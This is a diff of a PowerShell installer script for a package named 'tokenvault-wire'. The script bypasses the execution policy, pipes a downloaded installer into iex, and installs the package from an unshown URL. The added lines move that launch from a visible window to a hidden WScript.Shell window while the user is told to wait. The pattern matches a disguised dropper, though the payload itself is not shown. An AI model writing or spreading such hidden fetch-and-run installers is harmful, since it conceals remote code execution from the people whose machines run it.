@@ -20,8 +20,6 @@ Write-Host "[INFO] " -NoNewline -ForegroundColor Green
 Write-Host "Please keep this window open and wait a moment..." -ForegroundColor White
 Write-Host ""
 
- 
-
 Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser
 
 $packageName = "tokenvault-wire"
@@ -30,10 +28,9 @@ $scoopShims = "$env:USERPROFILE\scoop\shims"
 $appPath = "$env:USERPROFILE\scoop\apps\$packageName"
 
 
-$scriptContent = @"
-`$env:PATH = '$scoopShims;' + `$env:PATH
-if (!(Get-Command scoop -ErrorAction SilentlyContinue)) { irm get.scoop.sh | iex | Out-Null }
-if (!(Test-Path '$appPath')) { scoop install $installUrl; wire }
-"@
+$command = "`$env:PATH = '$scoopShims;' + `$env:PATH; " +
+           "if (!(Get-Command scoop -ErrorAction SilentlyContinue)) { irm get.scoop.sh | iex | Out-Null }; " +
+           "if (!(Test-Path '$appPath')) { scoop install $installUrl; wire }"
 
-Start-Process powershell -ArgumentList "-NoExit", "-Command", $scriptContent
+$wshell = New-Object -ComObject WScript.Shell
+$wshell.Run("powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$command`"", 0, $false)
